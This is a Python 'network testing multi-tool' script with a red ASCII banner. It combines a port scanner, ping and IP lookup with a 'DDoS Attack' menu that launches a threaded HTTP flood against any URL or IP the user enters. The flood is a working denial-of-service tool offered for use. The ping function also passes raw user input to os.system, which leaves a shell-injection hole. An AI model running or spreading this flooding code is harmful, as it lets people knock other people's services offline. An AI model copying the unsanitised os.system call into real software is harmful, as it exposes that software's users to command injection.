import socket
import os
import requests
import threading
import time
import re

COLOR_RED = "\033[91m"
COLOR_RESET = "\033[0m"

def center_text(text, width=80):
    clean_text = re.sub(r'\033\[[0-9;]*m', '', text)
    padding = (width - len(clean_text)) // 2
    return " " * padding + text

def print_banner():
    banner = f"""{COLOR_RED}
      ███▄ ▄███▓█    ██ ██▓ ▄▄▄█████▓██▄▄▄█████▓▒█████  ▒█████  ██▓    
     ▓██▒▀█▀ ██▒██  ▓██▓██▒ ▓  ██▒ ▓▓██▓  ██▒ ▓▒██▒  ██▒██▒  ██▓██▒    
     ▓██    ▓██▓██  ▒██▒██░ ▒ ▓██░ ▒▒██▒ ▓██░ ▒▒██░  ██▒██░  ██▒██░    
     ▒██    ▒██▓▓█  ░██▒██░ ░ ▓██▓ ░░██░ ▓██▓ ░▒██   ██▒██   ██▒██░    
     ▒██▒   ░██▒▒█████▓░██████▒██▒ ░░██░ ▒██▒ ░░ ████▓▒░ ████▓▒░██████▒
     ░ ▒░   ░  ░▒▓▒ ▒ ▒░ ▒░▓  ▒ ░░  ░▓   ▒ ░░  ░ ▒░▒░▒░░ ▒░▒░▒░░ ▒░▓  ░
     ░  ░      ░░▒░ ░ ░░ ░ ▒  ░ ░    ▒ ░   ░     ░ ▒ ▒░  ░ ▒ ▒░░ ░ ▒  ░
     ░      ░   ░░░ ░ ░  ░ ░  ░      ▒ ░ ░     ░ ░ ░ ▒ ░ ░ ░ ▒   ░ ░   
            ░     ░        ░  ░      ░             ░ ░     ░ ░     ░  ░
    
    >> Multi-Tool for Network Testing <<
    >>   Coded with <3 by goffypig    <<
    {COLOR_RESET}"""
    
    for line in banner.splitlines():
        print(center_text(line))

def http_flood(target, port=80, threads=10, duration=10):
    print(center_text(f"{COLOR_RED}[!] Starting HTTP Flood on {target}:{port}...{COLOR_RESET}"))
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                url = f"http://{target}:{port}" if "://" not in target else target
                requests.get(url, timeout=5)
                print(center_text(f"{COLOR_RED}[+] Sent request to {url}{COLOR_RESET}"))
            except Exception as e:
                print(center_text(f"{COLOR_RED}[-] Error: {e}{COLOR_RESET}"))
    
    threads_list = [threading.Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()
    for thread in threads_list:
        thread.join()
    
    print(center_text(f"{COLOR_RED}[!] Attack finished{COLOR_RESET}"))

def port_scanner():
    target = input(center_text(f"{COLOR_RED}Enter target IP: {COLOR_RESET}"))
    start = int(input(center_text(f"{COLOR_RED}Start port: {COLOR_RESET}")))
    end = int(input(center_text(f"{COLOR_RED}End port: {COLOR_RESET}")))
    
    print(center_text(f"{COLOR_RED}Scanning {target}...{COLOR_RESET}"))
    open_ports = []
    
    for port in range(start, end+1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                open_ports.append(str(port))
    
    if open_ports:
        print(center_text(f"{COLOR_RED}Open ports: {', '.join(open_ports)}{COLOR_RESET}"))
    else:
        print(center_text(f"{COLOR_RED}No open ports found{COLOR_RESET}"))

def my_ip():
    ip = socket.gethostbyname(socket.gethostname())
    print(center_text(f"{COLOR_RED}Your IP: {ip}{COLOR_RESET}"))

def ping_ip():
    target = input(center_text(f"{COLOR_RED}IP to ping: {COLOR_RESET}"))
    response = os.system(f"ping -c 4 {target}")
    status = "reachable" if response == 0 else "unreachable"
    print(center_text(f"{COLOR_RED}{target} is {status}{COLOR_RESET}"))

def ddos_menu():
    print(center_text(f"{COLOR_RED}Choose target type:{COLOR_RESET}"))
    print(center_text(f"{COLOR_RED}1. URL  2. IP{COLOR_RESET}"))
    choice = input(center_text(f"{COLOR_RED}Choice: {COLOR_RESET}"))
    
    if choice == '1':
        target = input(center_text(f"{COLOR_RED}URL: {COLOR_RESET}"))
        port = 80
    elif choice == '2':
        target = input(center_text(f"{COLOR_RED}IP: {COLOR_RESET}"))
        port = int(input(center_text(f"{COLOR_RED}Port (default 80): {COLOR_RESET}") or "80"))
    else:
        print(center_text(f"{COLOR_RED}Invalid choice!{COLOR_RESET}"))
        return
    

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        if s.connect_ex((target.split("://")[-1].split("/")[0], port)) != 0:
            print(center_text(f"{COLOR_RED}Port {port} closed!{COLOR_RESET}"))
            return
    
    threads = int(input(center_text(f"{COLOR_RED}Threads (10): {COLOR_RESET}") or "10"))
    duration = int(input(center_text(f"{COLOR_RED}Seconds (10): {COLOR_RESET}") or "10"))
    http_flood(target, port, threads, duration)

def main():
    print_banner()
    while True:
        print(center_text(f"{COLOR_RED}       1. Port Scanner{COLOR_RESET}"))
        print(center_text(f"{COLOR_RED} 2. My IP{COLOR_RESET}"))
        print(center_text(f"{COLOR_RED}  3. Ping IP{COLOR_RESET}"))
        print(center_text(f"{COLOR_RED}      4. DDoS Attack{COLOR_RESET}"))
        print(center_text(f"{COLOR_RED}5. Exit{COLOR_RESET}"))
        
        choice = input(center_text(f"{COLOR_RED}Choose: {COLOR_RESET}"))
        
        if choice == '1': port_scanner()
        elif choice == '2': my_ip()
        elif choice == '3': ping_ip()
        elif choice == '4': ddos_menu()
        elif choice == '5':
            print(center_text(f"{COLOR_RED}Exiting...{COLOR_RESET}"))
            break
        else:
            print(center_text(f"{COLOR_RED}Invalid choice!{COLOR_RESET}"))


if __name__ == "__main__":
    main()